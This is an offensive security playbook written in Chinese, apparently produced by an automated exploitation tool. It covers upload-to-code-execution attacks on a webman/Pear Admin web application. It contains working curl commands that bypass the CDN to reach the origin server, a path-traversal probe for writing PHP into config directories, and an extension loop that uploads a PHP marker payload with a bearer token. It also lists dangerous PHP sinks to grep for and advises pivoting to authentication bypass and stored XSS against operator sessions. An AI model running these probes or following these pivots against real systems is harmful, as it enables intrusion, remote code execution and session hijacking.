# webman/Pear Admin 目标「上传→执行」全判定手册（include/LFI/phar/模板 四路排除 + 扩展名名单测绘）

- **code**: webman-pear-admin-目标-上传-执行-全判定手册-include-lfi-phar-模板-四路排除-扩展名名单测绘
- **kind**: script
- **category**: path-traversal
- **component**: webman 2.1 / workerman 5.1.4 / Pear Admin 0.6.33
- **severity**: medium
- **language**: bash
- **source**: self
- **verified**: 1
- **verified_note**: 在 example-com（example.com / 203.0.113.95，webman 2.1 + workerman 5.1.4 + Pear Admin 0.6.33）实测：① /example.com 与 /phpinfo.php 均返回 SPA example.com（location / 走 try_files）⇒ 无 PHP-FPM；6 个 path-info 变体全 404/200 空。② GET /api/withdraw/uploadQrCode?userId=1 返回 {"code":401,"message":"请先登录"}，与不带参数完全一致 ⇒ $request->userId 不透传 ⇒ 落盘不可穿越。③ 扩展名矩阵：.php/.phar/.phtml→403，.php5/.php7/.php8/.inc→200 application/octet-stream 原样，.html→text/html、.svg→image/svg+xml 原样；上传点 429 冷却 120s。④ 静态审计 253 个 PHP：动态 include 仅 4 处全静态；eval/assert/$$/可变函数 0 命中；ZipArchive 0 命中；unserialize 3 处无可用 gadget；模板名全字面量 ⇒ include/LFI/phar/模板 四路全断。⑤ 能写 Monitor 监听目录的功能（table/* 代码生成器、plugin/install、install/step1）分别被部署版 403 开关（table/{index,view,show,create,modify,drop,types,crud,insert,update,delete,schema,select} 全 403）、管理员鉴权、is_file(plugin/admin/config/database.php) 守卫三道各自独立封死。证据留档 work/example/runs/exploit-include-route-audit.md、ex5_boundary_out.txt、ex7_userid_out.txt。
- **path**: pocs/webman-pear-admin-目标-上传-执行-全判定手册-include-lfi-phar-模板-四路排除-扩展名名单测绘/webman-upload-to-rce-checklist.md
- **tags**: webman,workerman,pear-admin,php,code-audit,lfj,lfi,phar,upload,rce,oracle
- **created_at**: 2026-10-12T11:05:14.682Z
- **found_by**: exploit

## 描述

webman(无 PHP-FPM) 目标「上传文件如何被执行」的四类决定性 oracle：FPM 判定、Monitor 监听目录写盘可达性、上传落盘路径穿越（$request->userId 注入）、nginx /uploads 扩展名反解析名单测绘。附全仓 sink grep 清单与两处典型白名单误判。

## 用法

```
1) 跑 §0 判定有无 FastCGI；2) 有 webman 源码就照 §4 grep，命中项逐个看上下文并对照 §4 的两处典型白名单误判；3) 用 §1 列出 Monitor 监听目录，穷举全站 file_put_contents 落点，判断能否写进去；4) 拿 §2 的 1 个请求判定 $userId 之类「中间件赋值属性」是否透传请求参数（决定有无路径穿越）；5) 用 §3 测绘上传点反解析名单，把未被拦的扩展名交给 XSS/投递线。全部命令用 curl -x <proxy> --connect-to <host>:443:<ip>:443 强制源站。
```

## 正文

```
# webman 目标「上传文件如何被执行」全判定手册（含 4 类决定性 oracle）
# 适用：nginx + webman(workerman 常驻 PHP) 架构；无 PHP-FPM 时上传的马直连永不执行，
#       唯一代码执行机制 = webman Monitor 热重载（写进监听目录）。
# 本手册在 example-com 上实测，结论：include/LFI/phar/模板 四路全断（详见 verified_note）。

## 0. 先定架构（决定后面所有方向是否有意义）
```bash
# 有 FastCGI 就会 502/504 或回显执行结果；落到 SPA try_files 说明无 FPM
curl -sS -k --http1.1 -x http://127.0.0.1:7892 --connect-to example.com:443:203.0.113.95:443 https://example.com/example.com   | head -3
curl -sS -k --http1.1 -x http://127.0.0.1:7892 --connect-to example.com:443:203.0.113.95:443 https://example.com/phpinfo.php | head -3
# path-info 形态也要试（老 nginx + fastgi_split_path_info 会执行）
#   /uploads/x.php7/   /uploads/x.php7%20   /uploads/x.php7.   /uploads/x.php7/x.jpg   /uploads/x.php/
```
无 FPM ⇒ 只剩下的执行机制是 Monitor 热重载，卡点是「写出」。

## 1. Monitor 监听目录（webman 默认 config/process.php，本项目实测）
监听：`app/`、`config/`、`process/`、`support/`、`resource/`、`.env`、`plugin/*/{app,config,api}`
扩展名：`php, html, htm, env`；命中 → `php -l` 通过 → `posix_kill(master, SIGUSR1)` → worker 重启
→ `support/bootstrap.php` 重跑 → **`Config::load` 会 include 配置文件**（把 payload 写进 `config/` 即执行）。
> 所以判定口径不是「能不能触发」，而是「**能不能写进这 9 个位置之一**」。上传目录（public/uploads、
> plugin/admin/public、runtime）**一个都不在监听列表**。

## 2. 上传落盘路径可穿越性 oracle（本目标否决）
三个上传点里唯一进入文件名的是 `$userId`；`$ext = UploadFile::getUploadExtension() = pathinfo($uploadName, PATHINFO_EXTENSION)`
**不可能含 `/`**，所以只能从 `$userId` 穿越。
决定性测试（1 个请求即可判定 webman 的 `$request->userId` 是否透传请求参数）：
```bash
curl -sS -k --http1.1 -x http://127.0.0.1:7892 --connect-to example.com:443:203.0.113.95:443 \
  "https://example.com/api/withdraw/uploadQrCode?userId=1"     # 自动路由=无 AuthMiddleware
```
- 返回业务错误（`400 请选择要上传的图片`）= **透传成功** ⇒ `$userId` 可控 ⇒ `../../../config/x_<uniqid>.php` 写进监听目录 = **RCE**。
- 返回 `401 请先登录` = 未透传（本目标实测结果）⇒ 穿越关闭。
自动路由形式 = `/{controller}/{action}`，控制器名首字母大写 + `Controller` 后缀，**不带路由级中间件**（可先拿它绕鉴权读数据）。

## 3. nginx `/uploads` 扩展名反解析名单测绘（给 XSS/投递线用）
逐扩展名上传同内容 `<?php echo "MARK:".md5(777); ?>` 再 GET 回读，记录 status+Content-Type：
```bash
for e in jpg html svg txt php phar phtml php5 php7 php8 inc; do
  curl -sS -k --http1.1 -x http://127.0.0.1:7892 --connect-to example.com:443:203.0.113.95:443 \
    -H "Authorization: Bearer $TOK" -F "file=@payload;filename=x.$e;type=image/jpeg" \
    https://example.com/api/v1/withdraw/upload-qrcode
done
```
本目标结果：**只需拦 `php|phar|phtml`**，`.php5/.php7/.php8/.inc` 全部 **200 + application/octet-stream + 原样内容**；
`.html`→`text/html`、`.svg`→`image/svg+xml`、`.jpg`→`image/jpeg` 全部原样（同源存储型 XSS 弹药）。
注意上传点有频率限制：约 10 次后 `{"code":429,"message":"请求过于频繁，请稍后 120 秒再试"}`。

## 4. 静态审计 sink 清单（对 PHP 项目按序 grep，逐个看上下文，不要只看命中行）
```
include|include_once|require|require_once        # 逐个确认路径来源是否来自 $request
eval\(|assert\(|create_function|call_user_func|call_user_func_array|forward_static_call|preg_replace
file_get_contents|readfile|fopen|file_exists|is_file|is_dir|filesize|unlink|rename|copy|move_uploaded_file
ZipArchive|getimagesize|md5_file|highlight_file|show_source|SplFileObject|scandir|glob|opendir|parse_ini_file
unserialize                        # 看有没有 allowed_classes=false；没有则查 vendor gadget
view\(|raw_view\(|render\(|template|trans\(|lang\(     # 第一个参数是不是字面量
file_put_contents|fwrite           # ★ 最高价值：看落点是否在 Monitor 监听目录
```
**易误判为洞、实为白名单的两处典型**（本目标都出现，避免重复挖）：
- `call_user_func([$this, $format_function], ...)` 而 `$format_function = $methods[$format] ?? 'formatNormal'` —— `$methods` 是硬编码映射表 ⇒ 不可控。
- `include $file` 前有 `is_file(base_path()."/plugin/$name/config/app.php")` —— 尾部固定拼接 `config/app.php`，`$name` 加多少 `../` 都到不了任意文件。

## 5. 收口建议
本路线（include/LFI/phar/模板 → RCE）对纯 webman（无 FPM）目标基本必断，**别把预算花在重测上**；
把精力放在 ① 绕过鉴权读数据/写 DB（自动路由、命名空间错配）② 上传点做同源 XSS 打运营侧会话 ③ 换 vhost/换系统。
```
